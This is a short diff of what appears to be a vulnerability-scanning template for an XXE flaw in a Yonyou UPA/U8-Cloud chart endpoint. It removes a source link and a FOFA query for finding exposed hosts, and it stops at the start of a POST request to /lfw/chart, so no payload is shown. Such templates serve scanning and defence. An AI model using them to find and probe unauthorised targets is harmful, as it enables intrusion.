@@ -3,12 +3,8 @@ info:
   name: 用友UPA系统chart接口 xxe漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/suo4w9gaccbot8xm'
+  description: ''
   tags: xxe,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: suo4w9gaccbot8xm
-    fofa: app="用友-U8-Cloud"
 http:
 - raw:
   - 'POST /lfw/chart HTTP/1.1
